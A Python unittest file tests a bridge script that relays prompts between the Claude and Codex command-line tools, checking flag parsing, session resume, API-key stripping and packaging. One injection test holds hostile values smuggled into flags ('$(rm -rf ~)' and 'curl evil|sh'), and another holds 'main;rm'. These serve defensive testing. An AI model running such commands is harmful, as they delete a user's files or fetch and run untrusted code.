from __future__ import annotations

import json
import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
BRIDGE = ROOT / "claude-codex-bridge"
SCRIPT = BRIDGE / "plugins" / "cx" / "bridge" / "bridge.ts"

CX_COMMANDS = (
    BRIDGE / "plugins/cx/commands/ask.md",
    BRIDGE / "plugins/cx/commands/review.md",
    BRIDGE / "plugins/cx/commands/task.md",
)
CC_PROMPTS = (
    BRIDGE / "codex-prompts/cc-ask.md",
    BRIDGE / "codex-prompts/cc-review.md",
    BRIDGE / "codex-prompts/cc-task.md",
    BRIDGE / "codex-prompts/cc-resume.md",
)

BUN = shutil.which("bun")

CODEX_STUB = """#!/bin/sh
printf '%s\\n' "$@" > "$STUB_DIR/codex-argv.txt"
cat > "$STUB_DIR/codex-stdin.txt"
prev=""; out=""
for a in "$@"; do [ "$prev" = "-o" ] && out="$a"; prev="$a"; done
[ -n "$out" ] && printf 'codex answer\\n' > "$out"
printf '{"type":"session.created","session_id":"aaaabbbb-cccc-4ddd-8eee-ffff00001111"}\\n'
printf '{"type":"turn.completed","usage":{"input_tokens":2000,"cached_input_tokens":500,"output_tokens":42,"reasoning_output_tokens":8}}\\n'
"""

CLAUDE_STUB = """#!/bin/sh
printf '%s\\n' "$@" > "$STUB_DIR/claude-argv.txt"
cat > "$STUB_DIR/claude-stdin.txt"
if [ -n "$ANTHROPIC_API_KEY" ]; then echo leaked > "$STUB_DIR/apikey-leak.txt"; fi
printf '{"result":"claude answer","session_id":"99998888-7777-4666-8555-444433332222","total_cost_usd":0.0712,"usage":{"input_tokens":1200,"cache_read_input_tokens":300,"cache_creation_input_tokens":0,"output_tokens":456},"is_error":false}\\n'
"""


def read(path: Path) -> str:
    return path.read_text(encoding="utf-8")


@unittest.skipUnless(BUN, "bun is required to test bridge.ts")
@unittest.skipIf(os.name == "nt", "stub executables are POSIX shell scripts")
class BridgeScriptTest(unittest.TestCase):
    """Integration tests: run the real script against stub codex/claude CLIs."""

    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="bridge-test-"))
        self.addCleanup(shutil.rmtree, self.tmp, True)
        self.repo = self.tmp / "repo"
        self.repo.mkdir()
        bin_dir = self.tmp / "bin"
        bin_dir.mkdir()
        for name, body in (("codex", CODEX_STUB), ("claude", CLAUDE_STUB)):
            stub = bin_dir / name
            stub.write_text(body, encoding="utf-8")
            stub.chmod(0o755)
        self.env = {
            **os.environ,
            "PATH": f"{bin_dir}:{os.environ['PATH']}",
            "XDG_STATE_HOME": str(self.tmp / "state"),
            "STUB_DIR": str(self.tmp),
            "ANTHROPIC_API_KEY": "sk-test-must-not-leak",
        }

    def bridge(self, subcommand: str, text: str, *extra: str) -> subprocess.CompletedProcess[str]:
        text_file = self.tmp / "text.md"
        text_file.write_text(text, encoding="utf-8")
        return subprocess.run(
            [BUN, str(SCRIPT), subcommand, "--text-file", str(text_file), "--repo", str(self.repo), *extra],
            capture_output=True,
            text=True,
            env=self.env,
            timeout=60,
        )

    def self_test(self, subcommand: str, text: str, *extra: str) -> dict:
        result = self.bridge(subcommand, text, "--self-test", *extra)
        self.assertEqual(0, result.returncode, result.stderr)
        return json.loads(result.stdout)

    # ------------------------------------------------ flag parsing & injection

    def test_valid_flags_move_to_argv_and_spark_is_mapped(self) -> None:
        decision = self.self_test("cx-ask", "what is this --model spark --effort high")
        self.assertIn("gpt-5.3-codex-spark", decision["argv"])
        self.assertIn("model_reasoning_effort=high", decision["argv"])
        self.assertIn("what is this", decision["stdin"])
        self.assertNotIn("--model", decision["stdin"])

    def test_invalid_flag_values_stay_in_stdin_never_argv(self) -> None:
        evil = 'x --model "$(rm -rf ~)" --effort "high; curl evil|sh"'
        decision = self.self_test("cx-ask", evil)
        self.assertNotIn("-m", decision["argv"])
        self.assertTrue(all("rm -rf" not in a for a in decision["argv"]))
        self.assertIn("$(rm -rf ~)", decision["stdin"])

    def test_flag_like_words_in_task_text_survive_when_value_invalid(self) -> None:
        # Design boundary: a charset-valid word after --model ("flag" vs
        # "sonnet") is indistinguishable from a model name and IS consumed;
        # enum/UUID-validated flags reject bad values and stay in the text.
        decision = self.self_test("cx-task", "add a --model flag to the parser --effort bogus")
        self.assertIn("--effort bogus", decision["stdin"])
        self.assertIn("-m", decision["argv"])
        self.assertNotIn("model_reasoning_effort=bogus", " ".join(decision["argv"]))

    def test_resume_with_non_uuid_token_is_bare_resume(self) -> None:
        result = self.bridge("cx-task", "--resume fix the login bug")
        self.assertEqual(2, result.returncode)
        self.assertIn("no bridge-owned Codex session", result.stderr)

    def test_explicit_uuid_resume_sends_delta_only(self) -> None:
        sid = "123e4567-e89b-42d3-a456-426614174000"
        decision = self.self_test("cx-task", f"--resume {sid} keep going")
        self.assertEqual(["codex", "exec", "resume", sid], decision["argv"][:4])
        self.assertEqual("keep going", decision["stdin"])
        self.assertNotIn("completeness_contract", decision["stdin"])

    def test_fresh_task_carries_full_contract_once(self) -> None:
        decision = self.self_test("cx-task", "refactor the parser")
        for marker in ("<completeness_contract>", "<verification_loop>", "<action_safety>"):
            self.assertEqual(1, decision["stdin"].count(marker))

    def test_review_scope_flags_validated(self) -> None:
        decision = self.self_test("cx-review", "--base main check error handling")
        self.assertIn("--base", decision["argv"])
        self.assertIn("--json", decision["argv"])  # needed so token usage is captured
        bad = self.self_test("cx-review", "--base 'main;rm' check stuff")
        self.assertIn("--uncommitted", bad["argv"])
        self.assertNotIn("--base", bad["argv"])

    def test_cx_ask_emits_json_and_token_footer(self) -> None:
        result = self.bridge("cx-ask", "what is this")
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertIn("codex answer", result.stdout)
        self.assertIn("tokens: in=2000 (cached 500) out=42 (reasoning 8)", result.stdout)
        # token usage comes from the JSONL event stream, which requires --json
        self.assertIn("--json", read(self.tmp / "codex-argv.txt"))

    # ----------------------------------------------------- registry round-trip

    def test_fresh_run_records_session_and_follow_up_resumes_it(self) -> None:
        first = self.bridge("cx-task", "do the thing")
        self.assertEqual(0, first.returncode, first.stderr)
        self.assertTrue(first.stdout.startswith("codex answer\n"), first.stdout)
        self.assertIn("tokens: in=2000 (cached 500) out=42 (reasoning 8)", first.stdout)
        second = self.bridge("cx-task", "keep going", "--follow-up")
        self.assertEqual(0, second.returncode, second.stderr)
        argv = read(self.tmp / "codex-argv.txt").split()
        self.assertIn("resume", argv)
        self.assertIn("aaaabbbb-cccc-4ddd-8eee-ffff00001111", argv)

    def test_corrupted_registry_is_rebuilt_not_crashed(self) -> None:
        state = Path(self.env["XDG_STATE_HOME"]) / "claude-codex-bridge" / "sessions"
        first = self.bridge("cc-ask", "warm up the registry")
        self.assertEqual(0, first.returncode, first.stderr)
        for f in state.rglob("cc-sessions.json"):
            f.write_text("{not json", encoding="utf-8")
        again = self.bridge("cc-ask", "second question")
        self.assertEqual(0, again.returncode, again.stderr)

    def test_cc_resume_inherits_recorded_mode(self) -> None:
        self.bridge("cc-ask", "first question")
        result = self.bridge("cc-resume", "and a follow-up")
        self.assertEqual(0, result.returncode, result.stderr)
        argv = read(self.tmp / "claude-argv.txt")
        self.assertIn("--resume\n99998888-7777-4666-8555-444433332222", argv)
        self.assertIn("Read,Grep,Glob", argv)
        self.assertNotIn("acceptEdits", argv)

    def test_cc_resume_unknown_session_requires_mode(self) -> None:
        result = self.bridge("cc-resume", "follow-up --session 00000000-0000-4000-8000-000000000000")
        self.assertEqual(2, result.returncode)
        self.assertIn("--mode ask|review|task", result.stderr)

    # ------------------------------------------------------- claude mechanics

    def test_billing_guard_strips_api_key_from_child(self) -> None:
        result = self.bridge("cc-ask", "does the key leak?")
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertFalse((self.tmp / "apikey-leak.txt").exists())

    def test_cc_output_ends_with_tokens_cost_and_session_line(self) -> None:
        result = self.bridge("cc-ask", "hello")
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertIn("claude answer", result.stdout)
        self.assertIn(
            "tokens: in=1500 (cached 300) out=456 | cost: $0.07 | session: 99998888-7777-4666-8555-444433332222",
            result.stdout,
        )

    def test_cc_task_uses_accept_edits_and_whitelist(self) -> None:
        decision = self.self_test("cc-task", "fix the bug")
        argv = decision["argv"]
        self.assertIn("acceptEdits", argv)
        self.assertTrue(any("Bash(make test *)" in a for a in argv), argv)
        self.assertTrue(decision["billingGuard"])

    def test_cc_review_base_flag_sets_scope_deterministically(self) -> None:
        decision = self.self_test("cc-review", "--base develop check the auth changes")
        self.assertIn("git diff develop...HEAD", decision["stdin"])
        self.assertIn("check the auth changes", decision["stdin"])


class MarkdownShellTest(unittest.TestCase):
    """The markdown layer must stay a thin intent shell around bridge.ts."""

    def test_cx_commands_invoke_bridge_and_disable_model_invocation(self) -> None:
        for path in CX_COMMANDS:
            text = read(path)
            with self.subTest(path=path.name):
                self.assertIn('bun "${CLAUDE_PLUGIN_ROOT}/bridge/bridge.ts"', text)
                self.assertIn("disable-model-invocation: true", text)
                self.assertIn("Write tool", text)

    def test_cc_prompts_invoke_bridge_on_both_shells(self) -> None:
        for path in CC_PROMPTS:
            text = read(path)
            with self.subTest(path=path.name):
                self.assertIn('bun "$HOME/.codex/bridge/bridge.ts"', text)
                self.assertIn("bun \"$env:USERPROFILE\\.codex\\bridge\\bridge.ts\"", text)

    def test_no_retry_no_fallback_in_every_shell(self) -> None:
        for path in (*CX_COMMANDS, *CC_PROMPTS):
            with self.subTest(path=path.name):
                self.assertIn("Do not retry", read(path))

    def test_mechanical_content_lives_in_script_not_markdown(self) -> None:
        # Contract blocks, tool whitelists, and registry paths must exist only
        # in bridge.ts; markdown copies would reintroduce the drift problem.
        script = read(SCRIPT)
        self.assertIn("<completeness_contract>", script)
        self.assertIn("Bash(make test *)", script)
        for path in (*CX_COMMANDS, *CC_PROMPTS):
            text = read(path)
            with self.subTest(path=path.name):
                self.assertNotIn("completeness_contract", text)
                self.assertNotIn("Bash(make test *)", text)
                self.assertNotIn("ANTHROPIC_API_KEY", text)


class PackagingTest(unittest.TestCase):
    def test_manifests_consistent(self) -> None:
        marketplace = json.loads(read(BRIDGE / ".claude-plugin/marketplace.json"))
        plugin = json.loads(read(BRIDGE / "plugins/cx/.claude-plugin/plugin.json"))
        self.assertEqual("cx", plugin["name"])
        self.assertIn(plugin["name"], {p["name"] for p in marketplace["plugins"]})

    def test_installers_deploy_bridge_script_and_warn_without_bun(self) -> None:
        sh = read(BRIDGE / "install.sh")
        ps1 = read(BRIDGE / "install.ps1")
        for text in (sh, ps1):
            self.assertIn("bridge.ts", text)
            self.assertIn("bun", text)
        self.assertIn(".codex/bridge", sh)
        self.assertIn(".codex\\bridge", ps1)

    def test_installers_preserve_the_first_backup(self) -> None:
        self.assertIn('[ ! -e "$target.bak" ]', read(BRIDGE / "install.sh"))
        self.assertIn('-not (Test-Path "$target.bak")', read(BRIDGE / "install.ps1"))


if __name__ == "__main__":
    unittest.main()
